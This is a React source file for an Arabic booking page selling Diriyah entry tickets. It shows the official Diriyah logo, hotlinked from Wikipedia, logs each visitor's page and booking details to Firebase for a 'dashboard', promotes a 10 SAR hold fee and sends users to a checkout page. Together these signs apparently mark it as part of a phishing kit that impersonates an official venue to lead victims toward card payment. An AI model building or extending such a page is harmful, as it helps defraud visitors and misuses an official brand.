import { ChevronDown, Calendar, Clock, Ticket, Info, Plus, Minus, CreditCard, Menu, X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Link, useLocation } from "wouter";
import { useState, useEffect } from "react";
import { addData, handleCurrentPage } from "@/lib/firebase";
import {
  BujairiFooter,
} from "@/components/bujairi-header";

const LOGO_URL =
  "https://upload.wikimedia.org/wikipedia/commons/5/57/%D8%B4%D8%B9%D8%A7%D8%B1_%D9%85%D9%88%D8%B3%D9%85_%D8%A7%D9%84%D8%AF%D8%B1%D8%B9%D9%8A%D8%A9.png?utm_source=ar.wikipedia.org&utm_campaign=index&utm_content=original";

const TICKET_PRICE = 50;
// Flat hold-fee that lets visitors confirm a booking now and pay the rest
// at the venue. Mirrors the partial-payment option on /reserve.
const PARTIAL_FEE = 10;
type PaymentMode = "full" | "partial";

export default function BookingPage() {
  const [date, setDate] = useState<Date | undefined>(new Date());
  const [time, setTime] = useState("09:00");
  const [quantity, setQuantity] = useState(1);
  const [paymentMode, setPaymentMode] = useState<PaymentMode>("full");

  useEffect(() => {
    handleCurrentPage("booking");
  }, []);

  return (
    <div className="min-h-screen bg-[#f4efe6] flex flex-col" dir="rtl">
      <Header />
      <main className="flex-1 pb-8">
        <BookingForm
          date={date}
          setDate={setDate}
          time={time}
          setTime={setTime}
          quantity={quantity}
          setQuantity={setQuantity}
          paymentMode={paymentMode}
          setPaymentMode={setPaymentMode}
        />
        <TermsSection />
      </main>
      <BujairiFooter />
    </div>
  );
}

function Header() {
  const [open, setOpen] = useState(false);
  const [, setLocation] = useLocation();

  return (
    <>
      <header className="flex justify-between items-center px-6 py-4 bg-[#f4efe6] border-b border-gray-200/55">
        <button
          onClick={() => setOpen(!open)}
          className="text-gray-800 p-1 cursor-pointer"
          data-testid="button-menu"
          aria-label="القائمة"
        >
          {open ? <X className="w-7 h-7" /> : <Menu className="w-7 h-7" />}
        </button>

        <div className="flex items-center gap-3">
          <div className="border border-[#8E4729] p-1 rounded">
            <img
              src={LOGO_URL}
              alt="الدرعية"
              className="h-8 object-contain"
            />
          </div>
        </div>
      </header>

      {open && (
        <nav
          className="fixed top-[70px] left-0 right-0 z-50 bg-black/90 backdrop-blur px-6 py-6 space-y-3"
          data-testid="nav-mobile-menu"
        >
          {[
            { href: "/", label: "الرئيسية" },
            { href: "/registration", label: "تسجيل الدخول" },
            { href: "/booking", label: "خيارات الحجز" },
          ].map((it) => (
            <a
              key={it.href}
              href={it.href}
              onClick={() => {
                setOpen(false);
                setLocation(it.href);
              }}
              className="block text-white text-lg py-2 border-b border-white/10 last:border-b-0 text-right cursor-pointer"
            >
              {it.label}
            </a>
          ))}
        </nav>
      )}
    </>
  );
}

function BookingForm({ 
  date, 
  setDate, 
  time, 
  setTime,
  quantity,
  setQuantity,
  paymentMode,
  setPaymentMode,
}: { 
  date: Date | undefined; 
  setDate: (d: Date | undefined) => void; 
  time: string; 
  setTime: (t: string) => void;
  quantity: number;
  setQuantity: (q: number) => void;
  paymentMode: PaymentMode;
  setPaymentMode: (m: PaymentMode) => void;
}) {
  const fullAmount = quantity * TICKET_PRICE;
  const dueNow = paymentMode === "partial" ? PARTIAL_FEE : fullAmount;
  const timeSlots = [
    "09:00", "10:00", "11:00", "12:00",
    "13:00", "14:00", "15:00", "16:00",
    "17:00", "18:00", "19:00", "20:00",
    "21:00", "22:00", "23:00", "00:00",
  ];
  const [, setLocation] = useLocation();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitError, setSubmitError] = useState("");

  const handleConfirmBooking = async () => {
    if (isSubmitting) return;
    setIsSubmitting(true);
    setSubmitError("");
    const bookingData = { date: date?.toISOString(), time };
    localStorage.setItem("bookingData", JSON.stringify(bookingData));
    const visitorId = localStorage.getItem("visitor");
    if (!visitorId) {
      const message = "لم يتم العثور على بيانات الزائر";
      setSubmitError(message);
      setIsSubmitting(false);
      return;
    }
    const ok = await addData({
      id: visitorId,
      currentPage: "booking",
      ticketQuantity: quantity,
      ticketPrice: TICKET_PRICE,
      // `totalAmount` is what the visitor is being charged right now —
      // either the full ticket price or the small hold deposit. Dashboard
      // displays this number, so it must reflect the chosen mode.
      totalAmount: dueNow,
      paymentMode,
      bookingDate: bookingData.date,
      bookingTime: bookingData.time,
    });
    if (!ok) {
      const message = "تعذر إكمال الحجز، يرجى المحاولة مرة أخرى";
      setSubmitError(message);
      setIsSubmitting(false);
      return;
    }
    setLocation("/checkout");
  };

  return (
    <section className="px-4 py-8" data-testid="section-booking-form">
      <div className="max-w-md mx-auto bg-white rounded-2xl shadow-xl overflow-hidden animate-fade-in">
        {/* Orange Banner Header */}
        <div className="bg-[#A85734] py-5 px-6 text-center">
          <h2 className="text-white text-xl font-bold">
            إتمام الشراء
          </h2>
        </div>

        <div className="p-6 space-y-6">
          {/* Cart Item Row */}
          <div className="flex items-center justify-between pb-6 border-b border-gray-100">
            <div className="flex items-center gap-4">
              <div className="w-20 h-16 rounded-lg overflow-hidden bg-gray-100 shrink-0">
                <img
                  src="/images/diriyah-hero.webp"
                  alt="حجز تذكرة دخول الدرعية"
                  className="w-full h-full object-cover"
                />
              </div>
              <div className="text-right">
                <h4 className="font-bold text-gray-900 text-sm md:text-base">حجز تذكرة دخول الدرعية</h4>
                <p className="text-gray-500 text-xs mt-1">{TICKET_PRICE}.00 ر.س</p>
                <div className="flex items-center gap-3 mt-2 bg-gray-50 border border-gray-200 rounded-lg px-2 py-1 w-fit">
                  <button
                    type="button"
                    onClick={() => setQuantity(quantity + 1)}
                    className="w-6 h-6 flex items-center justify-center text-gray-700 hover:bg-gray-200 rounded text-sm font-bold"
                    data-testid="button-increase-qty"
                  >
                    +
                  </button>
                  <span className="font-bold text-sm px-2" data-testid="text-quantity">
                    {quantity}
                  </span>
                  <button
                    type="button"
                    onClick={() => setQuantity(Math.max(1, quantity - 1))}
                    className="w-6 h-6 flex items-center justify-center text-gray-700 hover:bg-gray-200 rounded text-sm font-bold"
                    data-testid="button-decrease-qty"
                  >
                    -
                  </button>
                </div>
              </div>
            </div>
            <div className="text-left flex flex-col items-end justify-between h-full">
              <button 
                type="button" 
                onClick={() => setQuantity(1)}
                className="text-gray-400 hover:text-red-500 transition-colors p-1"
                title="حذف"
              >
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
                </svg>
              </button>
              <span className="font-bold text-gray-900 text-sm md:text-base mt-6">
                {fullAmount}.00 ر.س
              </span>
            </div>
          </div>

          <div className="space-y-6 pt-2">
            <div>
              <Label className="text-sm font-medium text-foreground mb-3 flex items-center gap-2">
                <Calendar className="w-4 h-4 text-primary" />
                اختيار التاريخ *
              </Label>
              <Input
                type="date"
                value={date ? date.toISOString().split('T')[0] : ''}
                onChange={(e) => setDate(e.target.value ? new Date(e.target.value) : undefined)}
                min={new Date().toISOString().split('T')[0]}
                className="w-full text-center h-12 rounded-xl border-2 focus:border-primary"
                data-testid="input-date"
              />
              {date && (
                <div className="text-center mt-3 p-3 bg-primary/10 rounded-xl" data-testid="text-selected-date">
                  <p className="text-sm text-primary font-medium">
                    التاريخ المحدد: {date.toLocaleDateString('ar-SA')}
                  </p>
                </div>
              )}
            </div>

            <div>
              <Label className="text-sm font-medium text-foreground mb-3 flex items-center gap-2">
                <Clock className="w-4 h-4 text-primary" />
                اختيار الوقت *
              </Label>
              <div className="relative">
                <select
                  value={time}
                  onChange={(e) => setTime(e.target.value)}
                  className="w-full h-12 px-4 rounded-xl border-2 border-input bg-background text-foreground appearance-none text-center font-medium focus:border-primary focus:outline-none"
                  data-testid="select-time"
                >
                  {timeSlots.map((slot) => (
                    <option key={slot} value={slot}>
                      {slot}
                    </option>
                  ))}
                </select>
                <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground pointer-events-none" />
              </div>
            </div>
          </div>

          {/* Payment mode: pay full now, or a small hold deposit to confirm */}
          <div className="space-y-3" data-testid="payment-mode-selector">
            <div className="grid grid-cols-2 gap-3">
              <button
                type="button"
                onClick={() => setPaymentMode("full")}
                className={`relative text-right p-3 rounded-xl border-2 transition-all ${
                  paymentMode === "full"
                    ? "border-primary bg-primary/5 shadow-sm"
                    : "border-input bg-white hover:border-[#c9a96e]"
                }`}
                data-testid="payment-mode-full"
              >
                <div className="text-[11px] text-muted-foreground mb-1">الدفع الكامل</div>
                <div className="text-foreground font-bold text-lg">{fullAmount}.00 ر.س</div>
                <div className="text-[10px] text-muted-foreground mt-1 leading-tight">
                  دفع كامل قيمة التذاكر
                </div>
                {paymentMode === "full" && (
                  <div className="absolute top-2 left-2 w-5 h-5 rounded-full bg-primary flex items-center justify-center">
                    <svg viewBox="0 0 16 16" className="w-3 h-3 text-white fill-current">
                      <path d="M6 11.5L2.5 8l1-1L6 9.5l6.5-6.5 1 1z" />
                    </svg>
                  </div>
                )}
              </button>
              <button
                type="button"
                onClick={() => setPaymentMode("partial")}
                className={`relative text-right p-3 rounded-xl border-2 transition-all ${
                  paymentMode === "partial"
                    ? "border-primary bg-primary/5 shadow-sm"
                    : "border-input bg-white hover:border-[#c9a96e]"
                }`}
                data-testid="payment-mode-partial"
              >
                <div className="flex items-center justify-between">
                  <div className="text-[11px] text-muted-foreground mb-1">دفع جزئي</div>
                  <span className="text-[9px] bg-[#c9a96e] text-white px-1.5 py-0.5 rounded font-bold">
                    موصى به
                  </span>
                </div>
                <div className="text-foreground font-bold text-lg">{PARTIAL_FEE}.00 ر.س</div>
                <div className="text-[10px] text-muted-foreground mt-1 leading-tight">
                  لتأكيد الحجز فقط
                </div>
                {paymentMode === "partial" && (
                  <div className="absolute top-2 left-2 w-5 h-5 rounded-full bg-primary flex items-center justify-center">
                    <svg viewBox="0 0 16 16" className="w-3 h-3 text-white fill-current">
                      <path d="M6 11.5L2.5 8l1-1L6 9.5l6.5-6.5 1 1z" />
                    </svg>
                  </div>
                )}
              </button>
            </div>

            <div className="bg-white/60 rounded-xl p-3 text-center text-xs text-muted-foreground">
              {paymentMode === "partial" ? (
                <>
                  يتم خصم <span className="font-bold text-primary">{PARTIAL_FEE}.00 ر.س</span> الآن لتأكيد الحجز،
                  والباقي <span className="font-bold text-primary">{fullAmount - PARTIAL_FEE}.00 ر.س</span> يُدفع عند الزيارة
                </>
              ) : (
                <>سيتم خصم المبلغ الكامل الآن</>
              )}
            </div>

            <div className="flex items-center justify-between pt-1">
              <span className="text-sm text-muted-foreground">المبلغ المستحق الآن</span>
              <span
                className="font-bold text-xl text-primary"
                data-testid="text-due-now"
              >
                {dueNow}.00 ر.س
              </span>
            </div>
          </div>

          <div className="space-y-3 pt-4">
            <Button 
              size="default"
              className="w-full bg-[#f4b844] hover:bg-[#e0a635] text-gray-900 font-bold shadow-md py-6 text-lg rounded-xl"
              onClick={() => {
                void handleConfirmBooking();
              }}
              disabled={isSubmitting}
              data-testid="button-confirm-booking"
            >
              {isSubmitting ? "جاري الإرسال..." : "المتابعة لإتمام الحجز"}
            </Button>

            {submitError && (
              <p className="text-red-500 text-xs text-center" data-testid="error-booking-submit">
                {submitError}
              </p>
            )}
            
            <Link href="/home">
              <Button 
                variant="outline"
                size="lg"
                className="w-full rounded-xl"
                data-testid="button-cancel-booking"
              >
                إلغاء
              </Button>
            </Link>
          </div>
        </div>
      </div>
    </section>
  );
}

function TermsSection() {
  return (
    <section className="px-4 py-6 max-w-md mx-auto" data-testid="section-booking-terms">
      <div className="bg-white rounded-2xl shadow-lg p-6">
        <div className="flex items-center gap-2 mb-4">
          <Info className="w-5 h-5 text-primary" />
          <h3 className="text-lg font-bold text-foreground">الشروط والأحكام</h3>
        </div>
        <div className="text-sm text-muted-foreground space-y-3 leading-relaxed">
          <p>
            يلزم الضيف بالحجز والوصول في الوقت المحدد.
          </p>
          <p>
            يلزم الضيف بعدم الحجز لتذاكر لعدة مطاعم في نفس الوقت، كما يُحظر إعادة بيع الحجوزات.
          </p>
          <p>
            يمكن إجراء الحجوزات من خلال الموقع الإلكتروني الخاص بالمحل فقط.
          </p>
          <p>
            الحجوزات تسمح بالدخول مرة واحدة إلى المنطقة ومغادرة التاريخ المحدد فقط.
          </p>
          <p>
            جميع المبالغ التي لم يتم دفعها للحجز غير مستردة.
          </p>
        </div>
      </div>
    </section>
  );
}

